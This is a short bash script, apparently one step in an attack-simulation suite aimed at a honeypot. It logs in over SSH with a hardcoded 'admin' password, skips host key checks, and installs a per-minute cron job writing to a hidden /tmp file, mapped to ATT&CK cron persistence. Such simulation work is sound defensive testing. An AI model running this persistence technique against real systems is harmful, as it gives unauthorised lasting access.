#!/usr/bin/env bash
# S14 — Cron Job Persistence
# Tactic : Persistence (TA0003)
# Technique: T1053.003 Scheduled Task/Job: Cron
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S14 Cron Persistence — ${TARGET} ==="
timeout ${TIMEOUT:-45} $SSH "crontab -l; (crontab -l 2>/dev/null; echo '* * * * * id > /tmp/.out') | crontab -; crontab -l" && echo "[OK]" || echo "[FAIL]"
